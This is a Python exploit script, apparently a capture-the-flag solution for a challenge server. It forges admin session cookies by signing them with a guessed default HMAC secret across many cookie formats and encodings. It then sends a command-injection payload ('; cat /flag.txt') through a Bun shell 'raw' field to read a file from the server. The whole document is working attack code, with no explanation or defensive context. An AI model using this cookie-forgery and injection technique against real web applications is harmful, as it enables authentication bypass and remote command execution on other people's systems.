import base64
import hashlib
import hmac
import itertools
import requests

TARGET_URL = "http://chals.bitskrieg.in:34607"
SECRET_KEY = "super_secret_key"

def _hmac_sha256(secret: str, data: str) -> bytes:
    return hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()

def _enc_variants(raw: bytes) -> list[str]:
    b64 = base64.b64encode(raw).decode()
    b64url = base64.urlsafe_b64encode(raw).decode()
    return [
        b64,
        b64.rstrip("="),
        b64url,
        b64url.rstrip("="),
        raw.hex(),
    ]

def candidate_cookies(username: str, secret: str):
    # what string gets signed?
    signed_datas = [
        username,
        f"session={username}",
        f"s:{username}",
        f"session=s:{username}",
    ]

    # cookie layouts to try
    # 1) session = "<value>.<sig>"
    # 2) session = "<value>", session.sig = "<sig>"
    prefixes = ["", "s:"]

    for prefix, data in itertools.product(prefixes, signed_datas):
        sig_raw = _hmac_sha256(secret, data)
        for sig in _enc_variants(sig_raw):
            value = f"{prefix}{username}"
            # layout A: single cookie combined
            yield {"session": f"{value}.{sig}"}
            # layout B: separate signature cookie
            yield {"session": value, "session.sig": sig}

def check_admin(s: requests.Session, cookies: dict) -> tuple[int, str]:
    s.cookies.clear()
    for k, v in cookies.items():
        s.cookies.set(k, v)

    # benign request to test auth
    r = s.post(f"{TARGET_URL}/admin/list", json={"folder": "."}, timeout=10)
    return r.status_code, r.text[:2000]

def exploit():
    s = requests.Session()

    # 1) Find an accepted cookie format
    good = None
    for cookies in candidate_cookies("admin", SECRET_KEY):
        code, txt = check_admin(s, cookies)
        if code == 200:
            good = cookies
            print("[+] Found working cookies:", cookies)
            break

    if not good:
        print("[-] No cookie format worked.")
        print("    => Either SECRET_KEY is NOT the default, or signing algo differs.")
        print("    Use curl login to inspect Set-Cookie and adjust.")
        return

    # 2) RCE via Bun $ raw injection
    payload = {"folder": {"raw": "; cat /flag.txt"}}
    r = s.post(f"{TARGET_URL}/admin/list", json=payload, timeout=10)
    print("status:", r.status_code)
    print(r.text)

if __name__ == "__main__":
    exploit()